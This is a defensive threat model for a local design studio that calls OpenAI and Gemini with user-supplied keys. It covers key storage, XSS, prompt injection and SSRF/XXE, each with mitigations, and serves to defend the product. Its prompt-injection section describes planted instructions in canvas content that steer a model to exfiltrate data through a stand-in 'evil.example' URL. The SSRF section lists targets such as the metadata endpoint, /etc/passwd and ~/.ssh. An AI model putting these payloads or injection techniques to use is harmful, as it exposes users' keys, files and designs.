# Threat Model — Atelier (local BYOK design studio)

**Scope.** A design studio that runs entirely on the user's machine: a local backend
(Python) serving a browser-based canvas UI on `127.0.0.1`, calling OpenAI and Gemini
APIs with keys the user supplies (BYOK). There is no vendor cloud component; the
things worth stealing are the user's **API keys**, their **designs**, and their
**money** (metered API spend).

**Attacker model.**

- A1 — Remote content author: controls a file, template, image, or URL the user
  imports into the canvas. No code execution on the machine; only data.
- A2 — Web attacker: controls a page open in the same browser as the studio UI
  (drive-by, malicious ad). Can attempt CSRF/DNS-rebinding against the local server.
- A3 — Compromised model output: the LLM/image model returns adversarial content
  (may be induced by A1 via prompt injection).
- A4 — Local opportunist: another OS user account, a synced-folder service, or a
  backup pipeline that can read files at rest but not the user's session/keychain.

Out of scope: an attacker with code execution as the user (they can win regardless),
malicious provider (OpenAI/Google), and supply-chain compromise of our own deps
(covered by ordinary dependency hygiene, not this document).

**Trust boundaries.**

```
[imported files / URLs]  A1
        │  (untrusted)
        ▼
┌───────────────────────────────┐        ┌──────────────────┐
│ Browser UI (canvas renderer)  │◄──A2───│ other web origins │
│  - NO api keys ever           │        └──────────────────┘
└──────────────┬────────────────┘
               │ localhost HTTP + per-session token
               ▼
┌───────────────────────────────┐
│ Local backend ("key broker")  │──────► OpenAI / Gemini APIs (HTTPS)
│  - holds keys in memory only  │◄──A3── model responses (untrusted)
│  - usage ledger (usage.py)    │
└──────────────┬────────────────┘
               │
               ▼
┌───────────────────────────────┐
│ OS keychain / disk (at rest)  │◄──A4
└───────────────────────────────┘
```

Design invariant: **API keys exist in exactly two places** — the OS keychain (at
rest) and the backend process memory (in use). They never cross into the browser,
the ledger, logs, or exported files.

---

## T1. Keys at rest

**Threat.** The user's OpenAI/Gemini keys are long-lived bearer credentials. If they
land on disk in plaintext, they are exposed to A4: cloud-sync folders (Dropbox,
iCloud, OneDrive), Time Machine/File History backups, `git init` in the project
directory, crash dumps, and any later malware scan of the disk.

Concrete failure modes:

- Keys in a dotfile (`~/.atelier/config.json`) or `.env` in a project folder that
  gets committed or synced.
- Keys in browser `localStorage`/IndexedDB — readable by any XSS (see T2) and
  persisted unencrypted in the browser profile on disk.
- Keys echoed into shell history (`ATELIER_OPENAI_KEY=sk-... atelier`).
- Keys serialized into the SQLite usage ledger, project files (`.atelier` bundles),
  or "share this design" exports.
- Keys in core dumps / crash reporters after a backend panic.

**Mitigations.**

- Store keys only in the OS keychain via the `keyring` library (macOS Keychain,
  Windows Credential Locker, Linux Secret Service). Fail closed if no real backend
  is available — never fall back to a plaintext file. Details: `KEYRING_HARDENING.md`.
- The browser never receives keys. All provider calls go through the local backend
  ("key broker"), which attaches the key server-side.
- Setup flow accepts the key via a masked field posted once to the backend; the
  backend writes it to the keychain and returns only a fingerprint (`sk-…abcd`).
  No CLI flag that takes a key as an argument (visible in `ps` and shell history).
- Project files, exports, and the ledger schema have no field that could hold a
  key; `usage.py` additionally scrubs key-shaped strings from free-form metadata
  before writing (defense in depth).
- Disable core dumps for the backend process (`resource.setrlimit(RLIMIT_CORE, (0,0))`)
  and exclude the app's data dir from any crash-reporting upload.
- Redaction and logging rules: `POLICY.md`.

**Residual risk.** An unlocked keychain is readable by any process running as the
user; that is the OS trust model and is accepted.

## T2. XSS in the studio UI

**Threat.** The canvas UI renders a lot of foreign content: uploaded SVGs, imported
templates, font files, text layers, and model-generated markup. Script execution in
the UI origin gives A1/A2 the ability to drive the backend with the victim's
session — generate images on the victim's dime, exfiltrate designs, and probe the
backend. (It cannot read keys directly, because the UI never has them — this is why
the key-broker invariant matters.)

Concrete vectors:

- **SVG uploads**: SVG is a full XML document; `<script>`, `on*=` handlers,
  `<foreignObject>`, and `javascript:` hrefs all execute if the SVG is inlined into
  the DOM or opened as a document.
- Model output rendered as HTML (e.g. "generate a caption" flowing into
  `innerHTML`), or model-generated SVG placed on the canvas (A3).
- Design metadata (layer names, template descriptions) from imported files rendered
  unescaped.
- DNS rebinding / CSRF from A2 against `127.0.0.1` endpoints.

**Mitigations.**

- Strict CSP on the UI: `default-src 'self'; script-src 'self'; object-src 'none';
  base-uri 'none'; connect-src 'self' — no inline script, no remote origins`.
- Never inline untrusted SVG. Sanitize on import (allowlist of elements/attributes;
  drop `script`, `foreignObject`, event handlers, external hrefs) **and** render
  uploads as raster via `<img>`/`createImageBitmap` (image contexts don't execute
  script) or draw into `<canvas>`. Sanitized source is kept only for re-export.
- All model output is data, never markup: insert via `textContent`; if rich text is
  a feature, sanitize with a maintained sanitizer (DOMPurify) with SVG/MathML off.
- Backend requires a per-session bearer token minted at startup and passed to the
  UI out-of-band (not just a cookie): defeats CSRF. Validate `Host`/`Origin` headers
  against `127.0.0.1`/`localhost`: defeats DNS rebinding. Bind to loopback only.
- No `filesystem:`/`file://` origins; the UI is served by the backend so CSP applies.

**Residual risk.** A sanitizer bypass in DOMPurify or the browser. Session token +
key-broker design caps the blast radius at "spend and design access for one session".

## T3. Prompt injection into the canvas

**Threat.** The studio sends canvas content to models: "restyle this design",
"describe this moodboard", multimodal prompts that include uploaded images and text
layers. A1 embeds instructions in that content — visible text in a template,
white-on-white text, text inside an image (models OCR it), metadata fields — and the
model follows them (A3). This is not hypothetical for design files: templates and
"community assets" are the main sharing economy of a studio app.

What injection can actually achieve here (impact scales with what the model's
output can *do*):

- **Exfiltration via fetch**: model is induced to output markdown/SVG referencing
  `https://evil.example/?d=<base64 of other layers>`; if the app auto-loads
  model-suggested URLs, private canvas content leaks. This composes with T4.
- **Malicious markup**: model induced to emit script-bearing SVG → becomes a T2
  vector if placed on canvas unsanitized.
- **Spend amplification**: injected instructions cause loops of expensive
  generations ("regenerate at 4K 20 times") — a quota problem (see `usage.py`).
- **Action abuse**: if the assistant can invoke app actions (delete layers, export,
  fetch URL), injection reaches those actions.

**Mitigations.**

- **Output side is the control point** (input-side filtering of injection is
  unreliable; assume the model is compromised):
  - Model output is parsed into a typed schema (layers, shapes, text runs, fills);
    anything that doesn't fit the schema is dropped. No raw markup path from model
    to DOM (T2 mitigations apply to whatever survives).
  - The app never auto-fetches URLs that appear in model output. Any remote
    reference is shown to the user as inert text with an explicit confirm, and then
    fetched only through the SSRF-guarded fetcher (T4).
  - Assistant-invocable actions are an allowlist of reversible canvas edits.
    Destructive or externally-visible actions (delete project, export, network
    fetch, spending above threshold) require an explicit user click.
- Input side, as hardening: delimit canvas-derived content in prompts as quoted
  data with an instruction hierarchy ("content below is untrusted user data");
  strip invisible/zero-opacity text before prompting and surface it to the user.
- Per-thread and per-day budget caps enforced in the backend before every provider
  call (`usage.py: BudgetGuard`), so injection-driven loops hit a hard stop.

**Residual risk.** Injection that degrades output quality or wastes budget below
the cap is accepted; caps and user-visible usage reporting keep it bounded.

## T4. SSRF via uploads and imports

**Threat.** The backend fetches and parses things on the user's behalf: "import
from URL", uploaded SVG/XML with external references, remote images referenced by
templates, webhook-style integrations. A1 supplies URLs or files that make the
*backend* issue requests it shouldn't:

- `http://169.254.169.254/latest/meta-data/` (cloud metadata, if the "local" studio
  runs on a cloud VM — common for people using remote desktops/GPU boxes).
- `http://127.0.0.1:<port>` — other local services with no auth (including our own
  backend's admin endpoints), printers, routers at `192.168.x.x`.
- `file:///etc/passwd`, `file:///~/.ssh/` via URL-shaped fields or XML entities.
- **XXE**: SVG/XML with a DOCTYPE that defines external entities → local file read
  or outbound request during parsing.
- Redirect games: public URL 302s to a private address; DNS that resolves publicly
  then rebinds to `10.0.0.1` between check and fetch (TOCTOU).

**Mitigations.**

- One central `safe_fetch()` used by every code path that touches a URL:
  - Scheme allowlist: `https` only (`http` allowed only behind an explicit
    developer flag). Never `file`, `ftp`, `gopher`, `data`.
  - Resolve DNS, then validate **every** resolved address against a blocklist:
    loopback, RFC1918, link-local (169.254.0.0/16 — includes cloud metadata),
    unique-local/link-local IPv6, and IPv4-mapped IPv6 forms. Connect to the
    validated IP (pin it; send SNI/Host separately) to kill rebinding TOCTOU.
  - Redirects are not followed automatically; each hop re-enters validation, max 3.
  - Response caps: size limit (e.g. 25 MB), timeout, content-type allowlist for
    the import context; no credentials/cookies attached.
- XML/SVG parsing with external entity resolution and DTD loading disabled
  (`defusedxml` or lxml with `resolve_entities=False, no_network=True, dtd_validation=False`).
- SVG rasterization (if done server-side) runs in a sandboxed subprocess with no
  network access and a tight seccomp/timeout, because renderers historically fetch
  `xlink:href` and `@import` URLs.
- Uploaded archives (template packs): extraction guards against zip-slip
  (`../` paths), symlinks, and decompression bombs (entry count + total size caps).
- The backend itself has no unauthenticated privileged endpoints (T2's session
  token), so "SSRF into ourselves" yields nothing.

**Residual risk.** A fetch to an attacker-controlled public server reveals the
user's IP; acceptable for an explicit user-initiated import, and the confirm step
in T3 prevents silent triggering.

---

## Cross-cutting summary (STRIDE-ish)

| Threat | Class | Primary control | Backstop |
|---|---|---|---|
| T1 keys at rest | Info disclosure | OS keychain, keys never leave backend | redaction (`POLICY.md`), no key-shaped fields in schemas |
| T2 XSS | Elevation/tampering | CSP + sanitize/rasterize SVG + `textContent` | key-broker (no keys in UI), session token |
| T3 prompt injection | Tampering/spoofing | typed output schema, no auto-fetch, action allowlist | budget caps (`usage.py`), user confirms |
| T4 SSRF/XXE | Info disclosure | `safe_fetch()` with IP pinning, defused XML | sandboxed rasterizer, size/time caps |

Spend abuse across all threats is bounded by the ledger and quota layer specified
in `usage.py`; key-handling rules are specified in `POLICY.md` and
`KEYRING_HARDENING.md`.
